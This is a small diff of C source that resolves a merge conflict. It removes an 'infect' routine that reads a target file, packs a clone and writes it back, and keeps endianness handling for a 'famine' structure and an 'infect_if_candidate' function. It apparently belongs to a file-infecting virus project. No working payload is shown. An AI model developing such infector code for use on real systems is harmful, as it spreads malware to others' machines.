@@ -10,21 +10,6 @@
 /*                                                                            */
 /* ************************************************************************** */
 
-<<<<<<< HEAD
-inline void		infect(const char *file)
-{
-	size_t		filesize;
-
-	if ((filesize = read_file(file)) == 0
-	|| !alloc_clone(filesize)
-	|| !packer(filesize)
-	|| !write_clone_file())
-		goto exit;
-
-exit:
-	free_clone();
-	free_file();
-=======
 #include "infect.h"
 
 static inline void	set_endian(struct famine *food, bool big_mode)
@@ -64,5 +49,4 @@ inline void		infect_if_candidate(const char *file)
 	printf("[%s]\n", file);
 
 	close(fd);
->>>>>>> origin/pic-endian
 }
